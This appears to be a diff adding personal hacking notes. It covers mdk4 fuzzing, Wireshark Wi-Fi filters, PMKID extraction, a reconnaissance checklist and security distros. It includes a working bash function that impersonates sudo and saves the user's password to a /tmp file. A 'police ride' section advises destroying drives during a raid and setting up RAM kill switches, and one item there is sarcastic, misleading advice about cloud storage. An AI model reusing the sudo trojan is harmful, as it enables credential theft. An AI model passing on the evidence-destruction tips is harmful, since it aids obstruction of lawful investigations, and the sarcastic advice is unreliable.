+         s - Shotgun: randomly overwrites a couple of bytes
+         t - append random bytes (creates broken tagged parameters in beacons/probes)
+         c - Cut packets short, preferably somewhere in headers or tags
+         d - Insert random values in Duration and Flags fields
+      -c [chan,chan,&#x2026;,chan[:speed]]
+         Enable channel hopping. When -c h is given, mdk4 will hop an all
+         14 b/g channels. Channel will be changed every 3 seconds,
+         if speed is not specified. Speed value is in milliseconds!
+      -p <pps>
+         Set speed in packets per second (Default: 250)
+
+
+<a id="orgae7567f"></a>
+
+# wireshark
+
+-   tshark -r example.pcap not icmp - dump
+-   capinfos example.pcap - info about file
+
+
+<a id="org03e7927"></a>
+
+## filters wifi
+
+-   wlan.fc.type==0 and wlan.fc.subtype==8 - beacon
+-   wlan.fc.type==0 and wlan.fc.subtype==4 - Probe request
+-   wlan.fc.type==0 and wlan.fc.subtype==5 - Probe response
+-   wlan.fc.type==1 and wlan.fc.subtype==13 - Acknowledgement
+-   wlan.fc.type==1 and wlan.fc.subtype==11 - RTS ready to send
+-   wlan.fc.type==1 and wlan.fc.subtype==12 - CTS Clear to send
+-   wlan.fc.addr - client MAC
+-   wlan.fc.ta - transmitter MAC
+-   wlan.fc.ra - receiver MAC
+-   wlan.fc.sa - source MAC
+-   wlan.fc.da - destination MAC
+-   wlan.bssid - BSSID MAC
+-   wlan<sub>mgt.ssid</sub> == "SSID here"
+
+-   radiotap.channel.freq == 5240 - frequency
+-   radiotap.datarate <= 6 - filter by data rate in Mbps
+-   radiotap.dbm<sub>antsignal</sub> >= -60 - filter by signal strength in dBm
+
+
+<a id="orgd5d03cb"></a>
+
+## install
+
+-   emerge &#x2013;ask net-analyzer/wireshark
+-   gpasswd -a $USER pcap
+-   gui require USE=qt5
+
+Edit -> Preference:
+
+-   Name Resolution -> Use an external network name resolver
+
+
+<a id="org4707d68"></a>
+
+## tools
+
+-   tshark - Dump and analyze network traffic
+-   capinfos - Prints information about capture files
+-   captype - Prints the types of capture files
+-   dumpcap - Dump network traffic
+-   editcap - Edit and/or translate the format of capture files
+-   idl2wrs - CORBA IDL to Wireshark Plugin Generator
+-   mergecap - Merges two or more capture files into one
+-   randpkt - Random packet generator
+-   rawshark - Dump and analyze raw pcap data
+-   reordercap - Reorder input file by timestamp into output file
+-   sharkd - ??
+-   text2pcap - Generate a capture file from an ASCII hexdump of packets
+-
+
+
+<a id="org5ffe160"></a>
+
+## flags
+
+-   <flag name="androiddump">Install androiddump, an extcap interface to capture from Android devices</flag>
+-   <flag name="bcg729">Use <pkg>media-libs/bcg729</pkg> for G.729 codec support in RTP Player</flag>
+-   <flag name="brotli">Use <pkg>app-arch/brotli</pkg> for compression/decompression</flag>
+-   <flag name="capinfos">Install capinfos, to print information about capture files</flag>
+-   <flag name="captype">Install captype, to print the file types of capture files</flag>
+-   <flag name="ciscodump">Install ciscodump, extcap interface to capture from a remote Cisco router</flag>
+-   <flag name="dftest">Install dftest, to display filter byte-code, for debugging dfilter routines</flag>
+-   <flag name="dpauxmon">Install dpauxmon, an external capture interface (extcap) that captures DisplayPort AUX channel data from linux kernel drivers</flag>
+-   <flag name="dumpcap">Install dumpcap, to dump network traffic from inside wireshark</flag>
+-   <flag name="editcap">Install editcap, to edit and/or translate the format of capture files</flag>
+-   <flag name="http2">Use <pkg>net-libs/nghttp2</pkg> for HTTP/2 support</flag>
+-   <flag name="ilbc">Build with iLBC support in RTP Player using <pkg>media-libs/libilbc</pkg></flag>
+-   <flag name="libxml2">Use <pkg>dev-libs/libxml2</pkg> for handling XML configuration in dissectors</flag>
+-   <flag name="lto">Enable link time optimization</flag>
+-   <flag name="maxminddb">Use <pkg>dev-libs/libmaxminddb</pkg> for IP address geolocation</flag>
+-   <flag name="mergecap">Install mergecap, to merge two or more capture files into one</flag>
+-   <flag name="minizip">Build with zip file compression support</flag>
+-   <flag name="netlink">Use <pkg>dev-libs/libnl</pkg></flag>
+-   <flag name="pcap">Use <pkg>net-libs/libpcap</pkg> for network packet capturing (build dumpcap, rawshark)</flag>
+-   <flag name="plugin-ifdemo">Install plugin interface demo</flag>
+-   <flag name="plugins">Install plugins</flag>
+-   <flag name="randpkt">Install randpkt, a utility for creating pcap trace files full of random packets</flag>
+-   <flag name="randpktdump">Install randpktdump, an extcap interface to provide access to the random packet generator (randpkt)</flag>
+-   <flag name="reordercap">Install reordercap, to reorder input file by timestamp into output file</flag>
+-   <flag name="sbc">Use <pkg>media-libs/sbc</pkg> for playing back SBC encoded packets</flag>
+-   <flag name="sdjournal">Install sdjournal, an extcap that captures systemd journal entries</flag>
+-   <flag name="sharkd">Install sharkd, the daemon variant of wireshark</flag>
+-   <flag name="smi">Use <pkg>net-libs/libsmi</pkg> to resolve numeric OIDs into human readable format</flag>
+-   <flag name="spandsp">Use <pkg>media-libs/spandsp</pkg> for for G.722 and G.726 codec support in the RTP Player</flag>
+-   <flag name="sshdump">Install sshdump, an extcap interface to capture from a remote host through SSH</flag>
+-   <flag name="text2pcap">Install text2pcap, to generate a capture file from an ASCII hexdump of packets</flag>
+-   <flag name="tfshark">Install tfshark, a terminal-based version of the FileShark capability</flag>
+-   <flag name="tshark">Install tshark, to dump and analyzer network traffic from the command line</flag>
+-   <flag name="udpdump">Install udpdump, to get packets exported from a source (like a network device or a GSMTAP producer) that are dumped to a pcap file</flag>
+
+
+<a id="orge684a85"></a>
+
+## decrypt WPA2 frames
+
+-   <https://mrncciew.com/2014/08/16/decrypt-wpa2-psk-using-wireshark/>
+
+
+<a id="org3d62516"></a>
+
+## extract PMKID
+
+1.  message: EAPOL protocl
+2.  Authentication
+3.  WPA Key Data
+4.  Tag: Vendor Specific
+5.  PMKID
+
+
+<a id="org12cdc55"></a>
+
+# python scapy - forge or decode packets
+
+-   <https://scapy.readthedocs.io/en/latest/api/scapy.layers.html>
+
+<https://pypi.org/project/scapy/>
+
+
+<a id="org5df0994"></a>
+
+# police ride
+
+
+<a id="orgb590ffa"></a>
+
+## 1
+
+Just store everything on random access memory and a backed up power supply with a kill switch.
+
+It takes 10 seconds without power to erase random access memory.
+
+If you need to turn off power for a while, you can transfer stuff from RAM to a hard drive, reboot, then transfer it back to ram and wipe the drives.
+
+There's already a kill power program to kill power if there's an undetected USB port connection I think.
+
+Unless you're extremely important, they're not going to send someone to manually crack your password and disable the kill switch program.
+
+You might be able to adjust the mobo voltage variance to be lower too so it shuts off if they try to manually attach something to the mobo without a port.
+
+But all this is kind of redundant because if they set up pinhole cameras in your place they can just record everything you're doing on the computer screen itself.
+
+They look like little pin holes and are usually in the corners of rooms near the ceiling.
+
+They can also put microphones in that way.
+
+You can make them all inoperable by just painting.
+
+If you're in an apartment or something, they'll rent or buy the apartment next door and drill through the walls to put them in.
+
+
+<a id="org8bf50ab"></a>
+
+## 2
+
+Use trusted cloud services like Google Cloud or Apple iCloud or Telegram Saved Messages, they
+protect your data from hackers and police with military-grade bulletproof encryption and redundant
+copies stored in multiple locations around the world. It's the industry-wide practice. Keep it
+simple, you silly kiddo.
+
+
+<a id="org34aefdb"></a>
+
+## 3
+
+If they break your door down, make sure to destroy your drives if you are concerned they will hold
+you prisoner until you hand over the keys. Make sure to get a good lawyer before any questioning of
+course. Do not give a single thing other than your name and DOB after arrest. In most "free"
+countries, you are obligated to unlock the drives if they have any suspicion of you. Muh UK can give
+you 5 years in prison just for refusing in the name of national security. It's better that the data
+no longer exists.
+
+If you want to store remotely on "the cloud", you can still do that relatively safely. Connect to
+one over anon network and upload files that you have encrypted with your own passphrase before
+uploading. Try to not give any personal information over to the service. I already do some file
+backups in this way for a file storage service.
+
+
+<a id="org8e24786"></a>
+
+# info gathering
+
+<https://resources.infosecinstitute.com/topic/kali-linux-top-5-tools-for-information-gathering/>
+
+-   DNS records (what domains do they have? What subdomains exist?)
+    -   Kali Linux DNS - spoof a website by redirecting a link to your destination such as a web server
+-   IDS/IPS events (intrusion detection systems and intrusion prevention systems)
+-   Network scanning (scanning for ports, MAC addresses and banner grabbing of a target’s systems)
+-   Operating systems (can detect operating systems and serve exploits if it is vulnerable)
+-   Routing (network configurations that can be found)
+-   Ports (sometimes these are opened and can provide information about the server’s software or services it provides)
+-   Users (find out who is logged in on a target system or what their account privileges are)
+-   Systems information. Items such as SMB open network shares and running processes for user accounts with non-privileged access
+-   SSL (are the systems or websites protected with secure sockets layer certificates)
+-   VPN (are there VPNs running on the network and are they authorized?)
+-   Voice over IP (Modern telephony uses this protocol to make voice calls. Are these protocols on their own VLAN? Can these packets be intercepted?
+-   SNMP (are there any devices with SNMP running on them? Are they accessible?
+-   Email addresses (can email addresses be intercepted for further cybercrimes such as phishing or ransomware payloads?)
+
+Network scanning
+
+-   port scanners
+-   service fingerprinting
+-   ARP spoofing (manipulating how data gets delivered from one computer to another)
+
+
+<a id="org3ae4332"></a>
+
+# sudo linux password stealing
+
+    function sudo () {
+        realsudo="$(which sudo)"
+
+        if grep -Fqs "$USER" /tmp/hackedPasswd.txt
+        then
+            $realsudo "${@:1}"
+        else
+            read -s -p "[sudo] password for $USER: " inputPasswd
+            printf "\n"; printf '%s\n' "$USER : $inputPasswd" > /tmp/hackedPasswd.txt
+            $realsudo -S <<< "$inputPasswd" -u root bash -c "exit" > /dev/null 2>&1
+            $realsudo "${@:1}"
+        fi
+    }
+
+
+<a id="orga63b4f8"></a>
+
+# distros
+
+
+<a id="org387e33a"></a>
+
+## kali
+
+“forensic mode”
+
+-   internal hard disk is never touched
+-   auto-mounting of removable media is disabled. (USB, CD -  nothing should happen to any media without direct user action)
+-
+
+<https://www.tutorialspoint.com/kali_linux/index.htm>
+
+-   Metasploit
+-   Maltego - network analysis
+-   Wireshark - packet sniffing
+-   Netcat - TCP and UDP protocols for things like port scanning or creating backdoor channels
+
+
+<a id="org425d55a"></a>
+
+## pentoo
+
+<https://www.pentoo.ch>
+
+-   default for expoiting
+-   hardenes
+-   bleeding<sub>edge</sub>
+
+USB stick of 8 GB minimum
+
+
+<a id="org25bdc05"></a>
+
+## Tails
+
+Tor os
+
+-   can save some of your files and configuration in an encrypted Persistent Storage on the USB stick
+-   never writes anything to the hard disk and only runs from the memory of the computer
+-   Tor Browser with uBlock
+-   Thunderbird, for encrypted emails
+-   KeePassXC, to create and store strong passwords
+-   LibreOffice, an office suite
+-   OnionShare, to share files over Tor
+-   Applications are blocked automatically if they try to connect to the Internet without Tor.
+-   Everything in the Persistent Storage is encrypted automatically.
+
+
+<a id="org18f98ce"></a>
+
+# virtualization
+
+apt-install virt-what
+
+
+<a id="org6e29d76"></a>
+
+# culture
+
+Serial Experiments Lain - <https://laingame.net>
+
+
+<a id="org63abd76"></a>
+
+## classification of hackers
+
+-   Cracker - gain unauthorized access to a computer in order to commit another crime such as destroying information
+    contained in that system
+-   White hat - non-malicious reasons, either to test their own security system, perform penetration tests or
+    vulnerability assessments for a client, or while working for a security company which makes security software
+-   Black hat - who "violates computer security for little reason beyond maliciousness or for personal gain", not criminal
+    hacker
+-   Grey hat - between a black hat and a white hat hacker
+-   Elite hacker -
+-   Script kiddie, s'kiddie, skid - unskilled hacker  WinNuke, Back Orifice, NetBus, Sub7, Metasploit, ProRat, PassJacker, iStealer, Snoopy
+-   Neophyte - ("newbie", or "noob") -
+-   Blue hat - used to bug-test a system prior to its launch. Microsoft red-team, blue-team concept.
+-   Hacktivist -
+-   Nation state - Intelligence agencies and cyberwarfare operatives of nation states
+-   Organized criminal gangs
